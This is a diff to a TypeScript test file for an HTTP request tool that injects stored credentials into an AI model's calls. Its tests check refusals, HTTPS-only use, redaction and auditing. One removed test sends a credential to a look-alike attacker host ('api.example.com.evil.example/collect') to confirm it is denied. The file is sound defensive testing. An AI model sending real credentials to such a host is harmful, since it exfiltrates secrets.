@@ -19,19 +19,12 @@ afterEach(() => {
   for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true })
 })
 
-function credential(send: CredentialSend, kind: CredentialSummary['kind'] = 'secret') {
+function credential(kind: CredentialSummary['kind'] = 'secret') {
   return {
     id: 'one',
     alias: 'api-key',
     kind,
     description: '',
-    usernameVisible: false,
-    ask: 'never' as const,
-    scope: {
-      projects: 'all' as const,
-      background: false,
-      web: { hosts: ['api.example.com'], tokenHosts: ['data.example.com'], send }
-    },
     createdAt: 1,
     updatedAt: 1,
     needsValue: false
@@ -53,24 +46,21 @@ function setup(
     { alias: 'api-key', value: SECRET },
     { alias: 'api-key', value: USERNAME }
   ])
-  const entry = credential(send, kind)
+  const entry = credential(kind)
   const record = vi.fn()
-  const uses = new CredentialUses(
-    {
-      list: () => [entry],
-      resolve: () => ({
-        summary: entry,
-        values: kind === 'secret' ? { secret: SECRET } : { username: USERNAME, password: SECRET }
-      }),
-      record,
-      setTransientSecrets: (secrets) =>
-        redactor.setSecrets([
-          { alias: 'api-key', value: SECRET },
-          ...secrets.map(({ alias, value }) => ({ alias, value }))
-        ])
-    },
-    () => ({ projectId: null, background: false })
-  )
+  const uses = new CredentialUses({
+    list: () => [entry],
+    resolve: () => ({
+      summary: entry,
+      values: kind === 'secret' ? { secret: SECRET } : { username: USERNAME, password: SECRET }
+    }),
+    record,
+    setTransientSecrets: (secrets) =>
+      redactor.setSecrets([
+        { alias: 'api-key', value: SECRET },
+        ...secrets.map(({ alias, value }) => ({ alias, value }))
+      ])
+  })
   const sent: Array<{ url: URL; config: AxiosRequestConfig }> = []
   const transport = vi.fn<HttpSend>(async (url, config) => {
     sent.push({ url: new URL(url.href), config })
@@ -94,11 +84,25 @@ function setup(
     send: transport
   })
   let calls = 0
-  /** Runs a call as the kernel does: credential uses it approved get a permit first. */
+  /**
+   * Runs a call as the kernel does: credential uses it approved get a permit first. A call that
+   * names a stored credential says it goes where `send` puts it, in the tool's own words.
+   */
   const call = (
-    args: Record<string, unknown>,
+    raw: Record<string, unknown>,
     { runId = 'run', approved = true }: { runId?: string; approved?: boolean } = {}
   ) => {
+    const { usernameName, ...placement } = send as CredentialSend & { usernameName?: string }
+    const args =
+      raw.credential === 'api-key' && raw.credential_as === undefined
+        ? {
+            ...raw,
+            credential_as: {
+              ...placement,
+              ...(usernameName ? { username_name: usernameName } : {})
+            }
+          }
+        : raw
     const context = { runId, conversationId: 'chat', toolCallId: `call-${++calls}` }
     if (approved) {
       for (const request of credentialRequestsFor('http_request', args, context)) {
@@ -173,7 +177,7 @@ describe('http_request', () => {
   })
 
   it('refuses to let the model set where the value goes itself', async () => {
-    const { call, transport } = setup()
+    const { call, transport, record } = setup()
     const result = await call({
       method: 'GET',
       url: 'https://api.example.com/',
@@ -183,6 +187,11 @@ describe('http_request', () => {
     expect(result.status).toBe('error')
     expect(result.error?.message).toContain('Leave out the Authorization header')
     expect(transport).not.toHaveBeenCalled()
+    // Audited as used, though nothing was sent.
+    expect(record.mock.calls.map(([kind]) => kind)).toEqual(['refused'])
+
+    await call({ method: 'GET', url: 'https://api.example.com/', credential: 'api-key' })
+    expect(record.mock.calls.map(([kind]) => kind)).toEqual(['refused', 'used'])
   })
 
   // A server that reads the model's copy of a field and echoes it would answer with the value.
@@ -221,7 +230,9 @@ describe('http_request', () => {
   ] as const)(
     'refuses a request that sets the credential’s place itself: %j %j',
     async (send, args, name) => {
-      const { call, transport } = setup(send as CredentialSend, 'sign_in')
+      // A sign-in sent in a body names its username field too.
+      const kind = 'usernameName' in send ? 'sign_in' : 'secret'
+      const { call, transport } = setup(send as CredentialSend, kind)
       const result = await call({
         method: 'GET',
         url: 'https://api.example.com/x',
@@ -245,11 +256,11 @@ describe('http_request', () => {
     expect(transport).not.toHaveBeenCalled()
   })
 
-  it('refuses a credential for another host without sending anything', async () => {
+  it('refuses a credential over plain HTTP without sending anything', async () => {
     const { call, transport, record } = setup()
     const result = await call({
       method: 'POST',
-      url: 'https://api.example.com.evil.example/collect',
+      url: 'http://api.example.com/collect',
       credential: 'api-key'
     })
     expect(result.status).toBe('denied')
@@ -257,7 +268,7 @@ describe('http_request', () => {
     expect(record).toHaveBeenCalledWith('refused', expect.anything(), expect.anything())
   })
 
-  it('turns returned tokens into aliases usable only with token hosts', async () => {
+  it('turns returned tokens into aliases usable only over HTTPS in the same reply', async () => {
     const token = randomBytes(24).toString('hex')
     const { call, sent } = setup({ as: 'form', name: 'client_secret' }, 'secret', {
       body: JSON.stringify({ token_type: 'Bearer', expires_in: 3600, access_token: token })
@@ -280,7 +291,7 @@ describe('http_request', () => {
     expect((sent[1].config.headers as Record<string, string>).Authorization).toBe(`Bearer ${token}`)
     const leak = await call({
       method: 'GET',
-      url: 'https://api.example.com/v1',
+      url: 'http://data.example.com/v1',
       credential: 'api-key~1'
     })
     expect(leak.status).toBe('denied')
@@ -447,7 +458,6 @@ describe('http_request', () => {
   })
 
   it('reports a failed request by its message alone', async () => {
-    const { call } = setup()
     const failing = vi.fn<HttpSend>(async () => {
       const error = new Error('connect ETIMEDOUT') as Error & { config?: unknown }
       error.config = { headers: { Authorization: `Bearer ${SECRET}` } }
@@ -464,6 +474,5 @@ describe('http_request', () => {
       context: { runId: 'run', signal: new AbortController().signal }
     })
     expect(result.error?.message).toBe('The request failed: connect ETIMEDOUT')
-    expect(call).toBeDefined()
   })
 })
